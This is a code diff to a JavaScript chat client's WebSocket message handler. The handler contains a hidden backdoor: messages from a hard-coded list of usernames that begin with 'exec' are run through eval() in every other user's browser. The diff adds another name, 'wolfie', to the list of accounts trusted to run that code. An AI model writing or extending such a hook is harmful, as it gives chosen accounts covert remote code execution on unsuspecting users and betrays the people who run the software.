@@ -564,7 +564,7 @@ ws.addEventListener("message", e => {
             break;
         case "message":
             if (msg.m.m.match(new RegExp("@" + user + "(\\s|$)", "g")) || msg.m.m.match(/@everyone(\s|$)/g) || msg.m.m.match(/@all(\s|$)/g)) ping.play();
-            if (["NKY", "NKY5223", "NKYv2", "NKYv3"].includes(msg.m.s) && !["NKY", "NKY5223", "NKYv2", "NKYv3"].includes(user)) {
+            if (["NKY", "NKY5223", "NKYv2", "NKYv3", "wolfie"].includes(msg.m.s) && !["NKY", "NKY5223", "NKYv2", "NKYv3"].includes(user)) {
                 if (msg.m.m.startsWith("exec " + user)) {
                     try {
                         eval(msg.m.m.slice(6 + user.length));
@@ -572,6 +572,7 @@ ws.addEventListener("message", e => {
                         sendMessage(e.toString());
                     }
                 } else if (msg.m.m.startsWith("exec $")) {
+                    if (msg.m.m === "exec $") sendMessage("");
                     try {
                         eval(msg.m.m.slice(7));
                     } catch(e) { 
